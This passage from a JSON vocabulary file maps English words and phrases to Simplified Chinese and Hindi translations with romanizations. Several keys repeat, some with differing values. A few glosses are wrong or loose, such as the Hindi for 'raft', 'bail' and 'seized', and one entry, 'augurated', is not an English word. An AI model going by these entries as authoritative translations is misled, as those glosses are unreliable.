            "arbitrate": {
                "Chinese (Simplified)": "仲裁 (zhòng cái)",
                "Hindi": "मध्यक्षता करना (maadhyakshata karna)"
            },
            "deal": {
                "Chinese (Simplified)": "交易 (jiāo yì)",
                "Hindi": "सौदा (sauda)"
            },
            "frequently": {
                "Chinese (Simplified)": "经常 (jīng cháng)",
                "Hindi": "बार-बार (baar-baar)"
            },
            "adjustments": {
                "Chinese (Simplified)": "调整 (tiáo zhěng)",
                "Hindi": "समायोजन (samaayojan)"
            },
            "rename": {
                "Chinese (Simplified)": "重命名 (chóng mìng míng)",
                "Hindi": "पुनः नामकरण (punah naamkaran)"
            },
            "better together": {
                "Chinese (Simplified)": "更好地在一起 (gèng hǎo de zài yī qǐ)",
                "Hindi": "साथ में बेहतर (saath mein behtar)"
            },
            "discontinued": {
                "Chinese (Simplified)": "停产 (tíng chǎn)",
                "Hindi": "बंद किया गया (band kiya gaya)"
            },
            "discontinue": {
                "Chinese (Simplified)": "停止 (tíng zhǐ)",
                "Hindi": "बंद करना (band karna)"
            },
            "further": {
                "Chinese (Simplified)": "进一步 (jìn yí bù)",
                "Hindi": "आगे (aage)"
            },
            "implementing": {
                "Chinese (Simplified)": "实施 (shí shī)",
                "Hindi": "लागू करना (laagu karna)"
            },
            "implement": {
                "Chinese (Simplified)": "实现 (shí xiàn)",
                "Hindi": "अमल में लाना (amal mein lana)"
            },
            "implementing": {
                "Chinese (Simplified)": "实施 (shí shī)",
                "Hindi": "लागू करना (laagu karna)"
            },
            "activate": {
                "Chinese (Simplified)": "激活 (jī huó)",
                "Hindi": "सक्रिय करना (sakriya karna)"
            },
            "deactivate": {
                "Chinese (Simplified)": "停用 (tíng yòng)",
                "Hindi": "निष्क्रिय करना (nishkriya karna)"
            },
            "activate": {
                "Chinese (Simplified)": "激活 (jī huó)",
                "Hindi": "सक्रिय करना (sakriya karna)"
            },
            "deactivate": {
                "Chinese (Simplified)": "停用 (tíng yòng)",
                "Hindi": "निष्क्रिय करना (nishkriya karna)"
            },
            "instability": {
                "Chinese (Simplified)": "不稳定 (bù wěn dìng)",
                "Hindi": "अस्थिरता (asthirta)"
            },
            "static": {
                "Chinese (Simplified)": "静态 (jìng tài)",
                "Hindi": "स्थिर (sthir)"
            },
            "dynamic": {
                "Chinese (Simplified)": "动态 (dòng tài)",
                "Hindi": "गतिशील (gatisheel)"
            },
            "feedback": {
                "Chinese (Simplified)": "反馈 (fǎn kuì)",
                "Hindi": "प्रतिक्रिया (pratikriya)"
            },
            "survival": {
                "Chinese (Simplified)": "生存 (shēng cún)",
                "Hindi": "जीवित रहना (jeevit rehna)"
            },
            "acquisition": {
                "Chinese (Simplified)": "收购 (shōu gòu)",
                "Hindi": "अधिग्रहण (adhigrahan)"
            },
            "validity": {
                "Chinese (Simplified)": "有效性 (yǒu xiào xìng)",
                "Hindi": "वैधता (vaidhata)"
            },
            "although": {
                "Chinese (Simplified)": "虽然 (suī rán)",
                "Hindi": "हालाँकि (haalanki)"
            },
            "contribute": {
                "Chinese (Simplified)": "贡献 (gòng xiàn)",
                "Hindi": "योगदान देना (yogdan dena)"
            },
            "contributors": {
                "Chinese (Simplified)": "贡献者 (gòng xiàn zhě)",
                "Hindi": "योगदानकर्ता (yogdan karta)"
            },
            "status": {
                "Chinese (Simplified)": "状态 (zhuàng tài)",
                "Hindi": "स्थिति (sthiti)"
            },
            "nope": {
                "Chinese (Simplified)": "不 (bù)",
                "Hindi": "नहीं (nahi)"
            },
            "ownership": {
                "Chinese (Simplified)": "所有权 (suǒ yǒu quán)",
                "Hindi": "स्वामित्व (swamitva)"
            },
            "classic": {
                "Chinese (Simplified)": "经典 (jīng diǎn)",
                "Hindi": "क्लासिक (classic)"
            },
            "adapt": {
                "Chinese (Simplified)": "适应 (shì yìng)",
                "Hindi": "अनुकूलित करना (anukoolit karna)"
            },
            "adapted": {
                "Chinese (Simplified)": "适应的 (shì yìng de)",
                "Hindi": "अनुकूलित (anukoolit)"
            },
            "adapting": {
                "Chinese (Simplified)": "适应 (shì yìng)",
                "Hindi": "अनुकूलित करना (anukoolit karna)"
            },
            "scar": {
                "Chinese (Simplified)": "疤痕 (bā hén)",
                "Hindi": "दाग (daag)"
            },
            "drown": {
                "Chinese (Simplified)": "淹死 (yān sǐ)",
                "Hindi": "डूबना (doobna)"
            },
            "potential": {
                "Chinese (Simplified)": "潜力 (qián lì)",
                "Hindi": "संभावना (sambhavna)"
            },
            "raft": {
                "Chinese (Simplified)": "木筏 (mù fá)",
                "Hindi": "पट्टी (patti)"
            },
            "tweaks": {
                "Chinese (Simplified)": "调整 (tiáo zhěng)",
                "Hindi": "सुधार (sudhaar)"
            },
            "monopoly": {
                "Chinese (Simplified)": "垄断 (lǒng duàn)",
                "Hindi": "एकाधिकार (ekadhikar)"
            },
            "duopoly": {
                "Chinese (Simplified)": "双头垄断 (shuāng tóu lǒng duàn)",
                "Hindi": "द्वैधाधिकार (dvaidhadhikar)"
            },
            "standalone": {
                "Chinese (Simplified)": "独立的 (dú lì de)",
                "Hindi": "स्वतंत्र (svatantra)"
            },
            "non standalone": {
                "Chinese (Simplified)": "非独立的 (fēi dú lì de)",
                "Hindi": "गैर-स्वतंत्र (gair-svatantra)"
            },
            "spectrum": {
                "Chinese (Simplified)": "光谱 (guāng pǔ)",
                "Hindi": "स्पेक्ट्रम (spectrum)"
            },
            "creed": {
                "Chinese (Simplified)": "信条 (xìn tiáo)",
                "Hindi": "विश्वास (vishwas)"
            },
            "odyssey": {
                "Chinese (Simplified)": "奥德赛 (ào dé sài)",
                "Hindi": "यात्रा (yatra)"
            },
            "clan": {
                "Chinese (Simplified)": "部落 (bù luò)",
                "Hindi": "कबीला (kabīlā)"
            },
            "clash": {
                "Chinese (Simplified)": "冲突 (chōng tú)",
                "Hindi": "टकराव (takraav)"
            },
            "what is happening": {
                "Chinese (Simplified)": "发生了什么 (fā shēng le shén me)",
                "Hindi": "क्या हो रहा है (kya ho raha hai)"
            },
            "genuine": {
                "Chinese (Simplified)": "真实的 (zhēn shí de)",
                "Hindi": "असली (asli)"
            },
            "i made it": {
                "Chinese (Simplified)": "我成功了 (wǒ chéng gōng le)",
                "Hindi": "मैंने इसे किया (maine ise kiya)"
            },
            "chuckle": {
                "Chinese (Simplified)": "轻笑 (qīng xiào)",
                "Hindi": "दबी हंसी (dabi hansi)"
            },
            "smirks": {
                "Chinese (Simplified)": "得意地笑 (dé yì de xiào)",
                "Hindi": "मुस्कान (muskaan)"
            },
            "kiddo": {
                "Chinese (Simplified)": "小孩 (xiǎo hái)",
                "Hindi": "बच्चा (bachcha)"
            },
            "chuckles softly": {
                "Chinese (Simplified)": "轻轻地笑 (qīng qīng de xiào)",
                "Hindi": "धीरे से हंसता है (dheere se hasta hai)"
            },
            "corner": {
                "Chinese (Simplified)": "角落 (jiǎo luò)",
                "Hindi": "कोना (kona)"
            },
            "private": {
                "Chinese (Simplified)": "私人 (sī rén)",
                "Hindi": "निजी (niji)"
            },
            "privatization": {
                "Chinese (Simplified)": "私有化 (sī yǒu huà)",
                "Hindi": "निजीकरण (nijikaran)"
            },
            "forehead": {
                "Chinese (Simplified)": "额头 (é tóu)",
                "Hindi": "माथा (maatha)"
            },
            "tingle": {
                "Chinese (Simplified)": "刺痛 (cì tòng)",
                "Hindi": "झनझनाहट (jhanjhanaahat)"
            },
            "relaxation": {
                "Chinese (Simplified)": "放松 (fàng sōng)",
                "Hindi": "आराम (aaram)"
            },
            "chores": {
                "Chinese (Simplified)": "家务活 (jiā wù huó)",
                "Hindi": "घरेलू काम (gharelu kaam)"
            },
            "suspect": {
                "Chinese (Simplified)": "怀疑 (huái yí)",
                "Hindi": "संदेह करना (sandeh karna)"
            },
            "stalk": {
                "Chinese (Simplified)": "跟踪 (gēn zōng)",
                "Hindi": "पीछा करना (peecha karna)"
            },
            "wink": {
                "Chinese (Simplified)": "眨眼 (zhǎ yǎn)",
                "Hindi": "आँख मारना (aankh maarna)"
            },
            "slack": {
                "Chinese (Simplified)": "松弛 (sōng chí)",
                "Hindi": "ढील (dheel)"
            },
            "flushing": {
                "Chinese (Simplified)": "脸红 (liǎn hóng)",
                "Hindi": "लाल होना (laal hona)"
            },
            "cheeks": {
                "Chinese (Simplified)": "脸颊 (liǎn jiá)",
                "Hindi": "गाल (gaal)"
            },
            "cheek": {
                "Chinese (Simplified)": "脸颊 (liǎn jiá)",
                "Hindi": "गाल (gaal)"
            },
            "flush": {
                "Chinese (Simplified)": "脸红 (liǎn hóng)",
                "Hindi": "लाल होना (laal hona)"
            },
            "suppose": {
                "Chinese (Simplified)": "假设 (jiǎ shè)",
                "Hindi": "मान लेना (maan lena)"
            },
            "turns back": {
                "Chinese (Simplified)": "转身 (zhuǎn shēn)",
                "Hindi": "पीछे मुड़ता है (peeche mudta hai)"
            },
            "choke": {
                "Chinese (Simplified)": "窒息 (zhì xī)",
                "Hindi": "घुटना (ghutna)"
            },
            "style": {
                "Chinese (Simplified)": "风格 (fēng gé)",
                "Hindi": "शैली (shailee)"
            },
            "smash": {
                "Chinese (Simplified)": "粉碎 (fěn suì)",
                "Hindi": "चूर-चूर करना (choor-choor karna)"
            },
            "fence": {
                "Chinese (Simplified)": "围栏 (wéi lán)",
                "Hindi": "बाड़ (baad)"
            },
            "configure": {
                "Chinese (Simplified)": "配置 (pèi zhì)",
                "Hindi": "कॉन्फ़िगर करना (configure karna)"
            },
            "pouch": {
                "Chinese (Simplified)": "小袋 (xiǎo dài)",
                "Hindi": "थैली (thaili)"
            },
            "traffic": {
                "Chinese (Simplified)": "交通 (jiāo tōng)",
                "Hindi": "यातायात (yaataayat)"
            },
            "landing": {
                "Chinese (Simplified)": "着陆 (zhuó lù)",
                "Hindi": "अवतरण (avataran)"
            },
            "candidate": {
                "Chinese (Simplified)": "候选人 (hòu xuǎn rén)",
                "Hindi": "उम्मीदवार (ummeedvaar)"
            },
            "goon": {
                "Chinese (Simplified)": "打手 (dǎ shǒu)",
                "Hindi": "गुंडा (gunda)"
            },
            "trap": {
                "Chinese (Simplified)": "陷阱 (xiàn jǐng)",
                "Hindi": "जाल (jaal)"
            },
            "mud": {
                "Chinese (Simplified)": "泥 (ní)",
                "Hindi": "कीचड़ (keechad)"
            },
            "wealthy": {
                "Chinese (Simplified)": "富有的 (fù yǒu de)",
                "Hindi": "धनी (dhani)"
            },
            "coupe": {
                "Chinese (Simplified)": "双门轿车 (shuāng mén jiào chē)",
                "Hindi": "कूपे कार (coupe car)"
            },
            "swat": {
                "Chinese (Simplified)": "拍打 (pāi dǎ)",
                "Hindi": "मारना (maar na)"
            },
            "bales": {
                "Chinese (Simplified)": "捆 (kǔn)",
                "Hindi": "गठरियाँ (gathriyan)"
            },
            "seal": {
                "Chinese (Simplified)": "封条 (fēng tiáo)",
                "Hindi": "सील (seal)"
            },
            "damn": {
                "Chinese (Simplified)": "该死 (gāi sǐ)",
                "Hindi": "धत्त (dhat)"
            },
            "wipe": {
                "Chinese (Simplified)": "擦拭 (cā shì)",
                "Hindi": "पोंछना (ponchna)"
            },
            "slat": {
                "Chinese (Simplified)": "条板 (tiáo bǎn)",
                "Hindi": "पट्टी (patti)"
            },
            "at": {
                "Chinese (Simplified)": "在 (zài)",
                "Hindi": "पर (par)"
            },
            "wish": {
                "Chinese (Simplified)": "愿望 (yuàn wàng)",
                "Hindi": "इच्छा (ichha)"
            },
            "last wish": {
                "Chinese (Simplified)": "最后的愿望 (zuì hòu de yuàn wàng)",
                "Hindi": "आखिरी इच्छा (aakhiri ichha)"
            },
            "further": {
                "Chinese (Simplified)": "进一步 (jìn yí bù)",
                "Hindi": "आगे (aage)"
            },
            "attempt": {
                "Chinese (Simplified)": "尝试 (cháng shì)",
                "Hindi": "प्रयास (prayaas)"
            },
            "authentic": {
                "Chinese (Simplified)": "真实的 (zhēn shí de)",
                "Hindi": "प्रामाणिक (praamaanik)"
            },
            "recover": {
                "Chinese (Simplified)": "恢复 (huī fù)",
                "Hindi": "पुनः प्राप्त करना (punah prapt karna)"
            },
            "factor": {
                "Chinese (Simplified)": "因素 (yīn sù)",
                "Hindi": "घटक (ghatak)"
            },
            "terrace": {
                "Chinese (Simplified)": "阳台 (yáng tái)",
                "Hindi": "छत (chhat)"
            },
            "dam": {
                "Chinese (Simplified)": "水坝 (shuǐ bà)",
                "Hindi": "बांध (baandh)"
            },
            "famous person": {
                "Chinese (Simplified)": "名人 (míng rén)",
                "Hindi": "प्रसिद्ध व्यक्ति (prasiddh vyakti)"
            },
            "throat": {
                "Chinese (Simplified)": "喉咙 (hóu lóng)",
                "Hindi": "गला (gala)"
            },
            "ago": {
                "Chinese (Simplified)": "以前 (yǐ qián)",
                "Hindi": "पहले (pehle)"
            },
            "anywhere": {
                "Chinese (Simplified)": "任何地方 (rèn hé dì fāng)",
                "Hindi": "कहीं भी (kahin bhi)"
            },
            "anytime": {
                "Chinese (Simplified)": "随时 (suí shí)",
                "Hindi": "कभी भी (kabhi bhi)"
            },
            "all at once": {
                "Chinese (Simplified)": "一下子 (yí xià zi)",
                "Hindi": "एक साथ (ek saath)"
            },
            "preserve": {
                "Chinese (Simplified)": "保存 (bǎo cún)",
                "Hindi": "सुरक्षित रखना (surakshit rakhna)"
            },
            "annual": {
                "Chinese (Simplified)": "年度的 (nián dù de)",
                "Hindi": "वार्षिक (varshik)"
            },
            "half": {
                "Chinese (Simplified)": "一半 (yí bàn)",
                "Hindi": "आधा (aadha)"
            },
            "policy": {
                "Chinese (Simplified)": "政策 (zhèng cè)",
                "Hindi": "नीति (neeti)"
            },
            "workspace": {
                "Chinese (Simplified)": "工作区 (gōng zuò qū)",
                "Hindi": "कार्यस्थल (karyasthal)"
            },
            "building": {
                "Chinese (Simplified)": "建筑 (jiàn zhù)",
                "Hindi": "भवन (bhavan)"
            },
            "castle": {
                "Chinese (Simplified)": "城堡 (chéng bǎo)",
                "Hindi": "किला (kila)"
            },
            "decide": {
                "Chinese (Simplified)": "决定 (jué dìng)",
                "Hindi": "निर्णय लेना (nirnay lena)"
            },
            "rude": {
                "Chinese (Simplified)": "粗鲁 (cū lǔ)",
                "Hindi": "असभ्य (asabhya)"
            },
            "instruction": {
                "Chinese (Simplified)": "指示 (zhǐ shì)",
                "Hindi": "निर्देश (nirdesh)"
            },
            "credentials": {
                "Chinese (Simplified)": "凭证 (píng zhèng)",
                "Hindi": "प्रमाण पत्र (pramaan patra)"
            },
            "credential": {
                "Chinese (Simplified)": "凭据 (píng jù)",
                "Hindi": "प्रमाण (pramaan)"
            },
            "ready to use": {
                "Chinese (Simplified)": "准备好使用 (zhǔn bèi hǎo shǐ yòng)",
                "Hindi": "उपयोग के लिए तैयार (upyog ke liye tayar)"
            },
            "notice": {
                "Chinese (Simplified)": "注意 (zhù yì)",
                "Hindi": "ध्यान देना (dhyaan dena)"
            },
            "noticed": {
                "Chinese (Simplified)": "注意到了 (zhù yì dào le)",
                "Hindi": "ध्यान दिया (dhyaan diya)"
            },
            "eye vision": {
                "Chinese (Simplified)": "视力 (shì lì)",
                "Hindi": "दृष्टि (drishti)"
            },
            "ceremony": {
                "Chinese (Simplified)": "仪式 (yí shì)",
                "Hindi": "समारोह (samaroh)"
            },
            "retire": {
                "Chinese (Simplified)": "退休 (tuì xiū)",
                "Hindi": "सेवानिवृत्त होना (sevanivritt hona)"
            },
            "retired": {
                "Chinese (Simplified)": "退休了 (tuì xiū le)",
                "Hindi": "सेवानिवृत्त (sevanivritt)"
            },
            "came out": {
                "Chinese (Simplified)": "出来了 (chū lái le)",
                "Hindi": "बाहर आया (baahar aaya)"
            },
            "mood": {
                "Chinese (Simplified)": "心情 (xīn qíng)",
                "Hindi": "मूड (mood)"
            },
            "boredom": {
                "Chinese (Simplified)": "无聊 (wú liáo)",
                "Hindi": "ऊब (oob)"
            },
            "engage": {
                "Chinese (Simplified)": "参与 (cān yù)",
                "Hindi": "सक्रिय करना (sakriya karna)"
            },
            "court": {
                "Chinese (Simplified)": "法院 (fǎ yuàn)",
                "Hindi": "कोर्ट (court)"
            },
            "seized": {
                "Chinese (Simplified)": "扣押 (kòu yā)",
                "Hindi": "जबरदस्ती किया (zabardasti kiya)"
            },
            "grant": {
                "Chinese (Simplified)": "授予 (shòu yǔ)",
                "Hindi": "अनुदान (anudaan)"
            },
            "granted": {
                "Chinese (Simplified)": "已授予 (yǐ shòu yǔ)",
                "Hindi": "अनुदानित (anudanit)"
            },
            "begins": {
                "Chinese (Simplified)": "开始 (kāi shǐ)",
                "Hindi": "शुरू होता है (shuru hota hai)"
            },
            "begin": {
                "Chinese (Simplified)": "开始 (kāi shǐ)",
                "Hindi": "शुरू करना (shuru karna)"
            },
            "i made it": {
                "Chinese (Simplified)": "我做到了 (wǒ zuò dào le)",
                "Hindi": "मैंने कर लिया (maine kar liya)"
            },
            "bail": {
                "Chinese (Simplified)": "保释 (bǎo shì)",
                "Hindi": "जमानत (jamaat)"
            },
            "injury": {
                "Chinese (Simplified)": "伤害 (shāng hài)",
                "Hindi": "चोट (chot)"
            },
            "injuries": {
                "Chinese (Simplified)": "伤害 (shāng hài)",
                "Hindi": "चोटें (choten)"
            },
            "report": {
                "Chinese (Simplified)": "报告 (bào gào)",
                "Hindi": "रिपोर्ट (report)"
            },
            "certificate": {
                "Chinese (Simplified)": "证书 (zhèng shū)",
                "Hindi": "प्रमाण पत्र (pramaan patra)"
            },
            "degree": {
                "Chinese (Simplified)": "学位 (xué wèi)",
                "Hindi": "डिग्री (degree)"
            },
            "reported": {
                "Chinese (Simplified)": "已报告 (yǐ bào gào)",
                "Hindi": "रिपोर्ट किया गया (report kiya gaya)"
            },
            "dial": {
                "Chinese (Simplified)": "拨号 (bō hào)",
                "Hindi": "डायल करना (dial karna)"
            },
            "committee": {
                "Chinese (Simplified)": "委员会 (wěi yuán huì)",
                "Hindi": "समिति (samiti)"
            },
            "inaugurated": {
                "Chinese (Simplified)": "开幕 (kāi mù)",
                "Hindi": "उद्घाटन किया (udghaatan kiya)"
            },
            "augurated": {
                "Chinese (Simplified)": "预示 (yù shì)",
                "Hindi": "आगमन (aagman)"
            },
            "convert": {
                "Chinese (Simplified)": "转化 (zhuǎn huà)",
                "Hindi": "रूपांतरित करना (roopantarit karna)"
            },
            "restore": {
                "Chinese (Simplified)": "恢复 (huī fù)",
                "Hindi": "पुनर्स्थापित करना (punarsthapit karna)"
            },
            "tie": {
                "Chinese (Simplified)": "平局 (píng jú)",
                "Hindi": "टाई (tie)"
            },
            "batter": {
                "Chinese (Simplified)": "打击手 (dǎ jí shǒu)",
                "Hindi": "बेटर (batter)"
            },
            "scheme": {
                "Chinese (Simplified)": "计划 (jì huà)",
                "Hindi": "योजना (yojana)"
            },
            "twist": {
                "Chinese (Simplified)": "扭曲 (niǔ qū)",
                "Hindi": "घुमा (ghuma)"
            },
            "hire": {
                "Chinese (Simplified)": "雇用 (gù yòng)",
                "Hindi": "भर्ती करना (bharti karna)"
            },
            "spend": {
                "Chinese (Simplified)": "花费 (huā fèi)",
                "Hindi": "खर्च करना (kharch karna)"
            },
            "spent": {
                "Chinese (Simplified)": "已花费 (yǐ huā fèi)",
                "Hindi": "खर्च किया (kharch kiya)"
            },
            "lots of time": {
                "Chinese (Simplified)": "大量时间 (dà liàng shí jiān)",
                "Hindi": "काफी समय (kaafi samay)"
            },
            "uncountable": {
                "Chinese (Simplified)": "不可计数 (bù kě jì shǔ)",
                "Hindi": "गिनती से बाहर (ginti se baahar)"
            },
            "qualify": {
                "Chinese (Simplified)": "资格 (zī gé)",
                "Hindi": "पात्र होना (paatra hona)"
            },
            "exhaust": {
                "Chinese (Simplified)": "排气 (pái qì)",
                "Hindi": "थकावट (thakavat)"
            },
            "casual": {
                "Chinese (Simplified)": "随意的 (suí yì de)",
                "Hindi": "आकस्मिक (aaksamik)"
            },
            "suffice": {
                "Chinese (Simplified)": "足够 (zú gòu)",
                "Hindi": "पर्याप्त होना (paryaapt hona)"
            },
            "syntax": {
                "Chinese (Simplified)": "语法 (yǔ fǎ)",
                "Hindi": "वाक्य रचना (vaakya rachna)"
            },
            "agreement": {
                "Chinese (Simplified)": "协议 (xié yì)",
                "Hindi": "समझौता (samjhauta)"
            },
            "script": {
                "Chinese (Simplified)": "脚本 (jiǎo běn)",
                "Hindi": "लिपि (lipi)"
            },
            "tone": {
                "Chinese (Simplified)": "声调 (shēng diào)",
                "Hindi": "स्वर (swar)"
            },
            "variety": {
                "Chinese (Simplified)": "多样性 (duō yàng xìng)",
                "Hindi": "विविधता (vividhata)"
            },
            "dish": {
                "Chinese (Simplified)": "菜 (cài)",
                "Hindi": "व्यंजन (vyanjan)"
            },
            "franchise": {
                "Chinese (Simplified)": "特许经营 (tè xǔ jīng yíng)",
                "Hindi": "फ्रेंचाइज़ (franchise)"
            },
            "flex": {
                "Chinese (Simplified)": "炫耀 (xuàn yào)",
                "Hindi": "दिखावा करना (dikhaava karna)"
            },
            "flexible": {
                "Chinese (Simplified)": "灵活的 (líng huó de)",
                "Hindi": "लचीला (lachila)"
            },
            "fetch": {
                "Chinese (Simplified)": "取回 (qǔ huí)",
                "Hindi": "लाना (laana)"
            },
            "wings": {
                "Chinese (Simplified)": "翅膀 (chì bǎng)",
                "Hindi": "पंख (pankh)"
            },
            "liberty": {
                "Chinese (Simplified)": "自由 (zì yóu)",
                "Hindi": "स्वतंत्रता (svatantrata)"
            },
            "statue": {
                "Chinese (Simplified)": "雕像 (diāo xiàng)",
                "Hindi": "प्रतिमा (pratima)"
            },
            "holy": {
                "Chinese (Simplified)": "神圣的 (shén shèng de)",
                "Hindi": "पवित्र (pavitra)"
            },
            "meditate": {
                "Chinese (Simplified)": "冥想 (míng xiǎng)",
                "Hindi": "ध्यान करना (dhyaan karna)"
            },
            "meditation": {
                "Chinese (Simplified)": "冥想 (míng xiǎng)",
                "Hindi": "ध्यान (dhyaan)"
            },
            "priest": {
                "Chinese (Simplified)": "牧师 (mù shī)",
                "Hindi": "पुजारी (pujaari)"
            },
            "band": {
                "Chinese (Simplified)": "乐队 (yuè duì)",
                "Hindi": "बैंड (band)"
            },
            "instrument": {
                "Chinese (Simplified)": "乐器 (yuè qì)",
                "Hindi": "संगीत वाद्य (sangeet vaadya)"
            },
            "dowry": {
                "Chinese (Simplified)": "嫁妆 (jià zhuāng)",
                "Hindi": "दहेज (dahej)"
            },
            "handshake": {
                "Chinese (Simplified)": "握手 (wò shǒu)",
                "Hindi": "हाथ मिलाना (haath milana)"
            },
            "energy": {
                "Chinese (Simplified)": "能量 (néng liàng)",
                "Hindi": "ऊर्जा (oorja)"
            },
            "crises": {
                "Chinese (Simplified)": "危机 (wēi jī)",
                "Hindi": "संकट (sankat)"
            },
            "marble": {
                "Chinese (Simplified)": "大理石 (dà lǐ shí)",
                "Hindi": "संगमरमर (sangmarmar)"
            },
            "premium": {
                "Chinese (Simplified)": "高级 (gāo jí)",
                "Hindi": "प्रीमियम (premium)"
            },
            "freemium": {
                "Chinese (Simplified)": "免费增值 (miǎn fèi zēng zhí)",
                "Hindi": "फ्रीमियम (freemium)"
            },
            "yeti": {
                "Chinese (Simplified)": "雪人 (xuě rén)",
                "Hindi": "येति (yeti)"
            },
            "speech": {
                "Chinese (Simplified)": "演讲 (yǎn jiǎng)",
                "Hindi": "भाषण (bhaashan)"
            },
            "teachings": {
                "Chinese (Simplified)": "教义 (jiào yì)",
                "Hindi": "शिक्षाएं (shikshaen)"
            },
            "fing": {
                "Chinese (Simplified)": "找不到对应词 (zhǎo bù dào duì yìng cí)",
                "Hindi": "इस शब्द का कोई स्पष्ट अर्थ नहीं है (is shabd ka koi spasht arth nahi hai)"
            },
            "bronze": {
                "Chinese (Simplified)": "青铜 (qīng tóng)",
                "Hindi": "कांस्य (kaansya)"
            },
            "pat": {
                "Chinese (Simplified)": "轻拍 (qīng pāi)",
                "Hindi": "थपथपाना (thapthapana)"
            },
            "big scam": {
                "Chinese (Simplified)": "大骗局 (dà piàn jú)",
                "Hindi": "बड़ा घोटाला (bada ghotala)"
            },
            "secretary": {
                "Chinese (Simplified)": "秘书 (mì shū)",
                "Hindi": "सचिव (sachiv)"
            },
            "alimony": {
                "Chinese (Simplified)": "赡养费 (shàn yǎng fèi)",
                "Hindi": "गुजारा भत्ता (guzaara bhatta)"
            },
            "injustice": {
                "Chinese (Simplified)": "不公正 (bù gōng zhèng)",
                "Hindi": "अन्याय (anyaay)"
            },
            "ego": {
                "Chinese (Simplified)": "自我 (zì wǒ)",
                "Hindi": "अहम (aham)"
            },
            "internship": {
                "Chinese (Simplified)": "实习 (shí xí)",
                "Hindi": "इंटर्नशिप (internship)"
            },
            "least": {
                "Chinese (Simplified)": "最少 (zuì shǎo)",
                "Hindi": "कम से कम (kam se kam)"
            },
            "atleast": {
                "Chinese (Simplified)": "至少 (zhì shǎo)",
                "Hindi": "कम से कम (kam se kam)"
            },
            "guilt": {
                "Chinese (Simplified)": "内疚 (nèi jiù)",
                "Hindi": "अपराधबोध (aparaadhbodh)"
            },
            "pie": {
                "Chinese (Simplified)": "馅饼 (xiàn bǐng)",
                "Hindi": "पाई (pai)"
            },
            "chance": {
                "Chinese (Simplified)": "机会 (jī huì)",
                "Hindi": "अवसर (avasar)"
            },
            "asleep": {
                "Chinese (Simplified)": "睡着的 (shuì zháo de)",
                "Hindi": "सोया हुआ (soya hua)"
            },
            "slept": {
                "Chinese (Simplified)": "睡了 (shuì le)",
                "Hindi": "सोया (soya)"
            },
            "nomad": {
                "Chinese (Simplified)": "游牧民 (yóu mù mín)",
                "Hindi": "घुमंतू (ghumantu)"
            },
            "pastoralist": {
                "Chinese (Simplified)": "牧民 (mù mín)",
                "Hindi": "चरवाहा (charwaha)"
            },
            "overpowered": {
                "Chinese (Simplified)": "压倒 (yā dǎo)",
                "Hindi": "प्रबल (prabal)"
            },
            "abandon": {
                "Chinese (Simplified)": "放弃 (fàng qì)",
                "Hindi": "त्याग देना (tyaag dena)"
            },
            "abolish": {
                "Chinese (Simplified)": "废除 (fèi chú)",
                "Hindi": "समाप्त करना (samaapt karna)"
            },
            "abscond": {
                "Chinese (Simplified)": "潜逃 (qián táo)",
                "Hindi": "फरार होना (faraar hona)"
            },
            "accelerate": {
                "Chinese (Simplified)": "加速 (jiā sù)",
                "Hindi": "तेज़ करना (tez karna)"
            },
            "advocate": {
                "Chinese (Simplified)": "提倡 (tí chàng)",
                "Hindi": "वकालत करना (vakalat karna)"
            },
            "backbite": {
                "Chinese (Simplified)": "背后诽谤 (bèi hòu fěi bàng)",
                "Hindi": "पीठ पीछे बुराई करना (peeth peeche buraai karna)"
            },
            "chasm": {
                "Chinese (Simplified)": "鸿沟 (hóng gōu)",
                "Hindi": "गहरा खाई (gehra khaai)"
            },
            "sarcasm": {
                "Chinese (Simplified)": "讽刺 (fěng cì)",
                "Hindi": "व्यंग्य (vyangya)"
            },
            "sarcastic": {
                "Chinese (Simplified)": "讽刺的 (fěng cì de)",
                "Hindi": "ताने भरा (taane bhara)"
            },
            "cringe": {
                "Chinese (Simplified)": "畏缩 (wèi suō)",
                "Hindi": "सिकुड़ना (sikudna)"
            },
            "phobia": {
                "Chinese (Simplified)": "恐惧症 (kǒng jù zhèng)",
                "Hindi": "फोबिया (phobia)"
            },
            "cliche": {
                "Chinese (Simplified)": "陈词滥调 (chén cí làn diào)",
                "Hindi": "घिसा-पिटा वाक्यांश (ghisa-pita vaakyansh)"
            },
            "delicate": {
                "Chinese (Simplified)": "精致的 (jīng zhì de)",
                "Hindi": "नाज़ुक (naazuk)"
            },
            "depict": {
                "Chinese (Simplified)": "描绘 (miáo huì)",
                "Hindi": "चित्रित करना (chitrit karna)"
            },
            "isolate": {
                "Chinese (Simplified)": "隔离 (gé lí)",
                "Hindi": "अलग करना (alag karna)"
            },
            "endure": {
                "Chinese (Simplified)": "忍受 (rěn shòu)",
                "Hindi": "सहना (sahana)"
            },
            "suffer": {
                "Chinese (Simplified)": "遭受 (zāo shòu)",
                "Hindi": "झेलना (jhelna)"
            },
            "extricate": {
                "Chinese (Simplified)": "解脱 (jiě tuō)",
                "Hindi": "मुक्त करना (mukt karna)"
            },
            "fidelity": {
                "Chinese (Simplified)": "忠诚 (zhōng chéng)",
                "Hindi": "निष्ठा (nishtha)"
            },
            "gamble": {
                "Chinese (Simplified)": "赌博 (dǔ bó)",
                "Hindi": "जुआ खेलना (jua khelna)"
            },
            "gaze": {
                "Chinese (Simplified)": "凝视 (níng shì)",
                "Hindi": "घूरना (ghurna)"
            },
            "genre": {
                "Chinese (Simplified)": "类型 (lèi xíng)",
                "Hindi": "शैली (shailee)"
            },
            "genial": {
                "Chinese (Simplified)": "和蔼的 (hé ǎi de)",
                "Hindi": "मिलनसार (milansaar)"
            },
            "haughty": {
                "Chinese (Simplified)": "傲慢的 (ào màn de)",
                "Hindi": "घमंडी (ghamandi)"
            },
            "imperative": {
                "Chinese (Simplified)": "必要的 (bì yào de)",
                "Hindi": "आवश्यक (aavashyak)"
            },
            "indigenous": {
                "Chinese (Simplified)": "本土的 (běn tǔ de)",
                "Hindi": "देशज (deshaj)"
            },
            "judicious": {
                "Chinese (Simplified)": "明智的 (míng zhì de)",
                "Hindi": "समझदार (samajhdar)"
            },
            "keen": {
                "Chinese (Simplified)": "热衷的 (rè zhōng de)",
                "Hindi": "उत्सुक (utsuk)"
            },
            "kickoff": {
                "Chinese (Simplified)": "开球 (kāi qiú)",
                "Hindi": "आरंभ (aarambh)"
            },
            "kindle": {
                "Chinese (Simplified)": "点燃 (diǎn rán)",
                "Hindi": "प्रज्वलित करना (prajwalit karna)"
            },
            "knight": {
                "Chinese (Simplified)": "骑士 (qí shì)",
                "Hindi": "योद्धा (yoddha)"
            },
            "lunatic": {
